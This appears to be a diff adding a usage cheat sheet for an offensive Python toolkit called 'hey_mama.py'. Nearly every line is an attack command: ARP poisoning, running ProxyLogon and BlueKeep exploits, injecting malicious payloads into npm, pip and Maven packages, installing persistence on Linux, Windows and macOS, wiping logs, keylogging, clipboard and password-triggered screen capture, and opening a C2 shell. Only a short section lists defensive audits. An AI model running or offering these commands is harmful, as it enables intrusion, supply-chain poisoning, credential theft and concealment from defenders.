@@ -1,0 +1,49 @@
+# 1) General / Misc
+python3 hey_mama.py --version
+python3 hey_mama.py --help
+
+# 2) Reconnaissance & Scanning
+python3 hey_mama.py --scan <SUBNET>              # e.g. 10.0.0.0/24
+python3 hey_mama.py --shodan "<QUERY>"           # e.g. "apache country:US"
+python3 hey_mama.py --dnsenum <DOMAIN>           # e.g. example.com
+python3 hey_mama.py --wifi_scan
+python3 hey_mama.py --arp_poison <IFACE> <TARGET> # e.g. eth0 192.168.1.100
+python3 hey_mama.py --passive_dns <DOMAIN>       # e.g. example.com
+
+# 3) Exploit Management
+python3 hey_mama.py --exploit_list
+python3 hey_mama.py --run_exploit <NAME> <TARGET>  # e.g. cve_2021_26855_proxylogon 10.0.0.5
+python3 hey_mama.py --can_run <NAME> <TARGET>       # e.g. cve_2019_0708_bluekeep 192.168.1.50
+
+# 4) Supply‑Chain & Cloud
+python3 hey_mama.py --npm_inject <PKG> <PAYLOAD_JS>         # e.g. lodash /path/to/malicious.js
+python3 hey_mama.py --pip_inject <PKG> <PAYLOAD_PY>         # e.g. requests /path/to/malicious.py
+python3 hey_mama.py --maven_inject <GROUP:ARTIFACT> <PAYLOAD_JAVA>  
+                                                            # e.g. org.apache:commons-io /path/to/Malicious.java
+python3 hey_mama.py --cloud_aws
+python3 hey_mama.py --cloud_azure
+python3 hey_mama.py --cloud_gcp
+
+# 5) Persistence
+python3 hey_mama.py --persist_linux <SCRIPT_PATH>        # e.g. /home/user/my_malware.sh
+python3 hey_mama.py --persist_win_schtask <SCRIPT_PATH>  # e.g. C:\Windows\System32\evil.bat
+python3 hey_mama.py --persist_win_rkey <SCRIPT_PATH>     # e.g. C:\Windows\System32\evil.bat
+python3 hey_mama.py --persist_mac_daemon <SCRIPT_PATH>   # e.g. /Users/Shared/evil.sh
+
+# 6) Stealth & Anti‑Forensics
+python3 hey_mama.py --stealth
+python3 hey_mama.py --wipe_logs
+
+# 7) Keylogging & Sensitive Capture
+python3 hey_mama.py --start_keylogger <DB_PATH>          # e.g. /tmp/keylog.db
+python3 hey_mama.py --start_clip_sniffer <DB_PATH>       # e.g. /tmp/keylog.db
+python3 hey_mama.py --start_screen_cap <DB_PATH:KEYWORD> # e.g. /tmp/keylog.db:password
+
+# 8) Defensive Utilities (Audit/Inspect)
+python3 hey_mama.py --firewall_audit
+python3 hey_mama.py --log_inspect
+python3 hey_mama.py --remediate <OS>                     # e.g. linux, macos, or windows
+
+# 9) C2 Interaction
+python3 hey_mama.py --launch_dispatcher
+python3 hey_mama.py --c2_shell
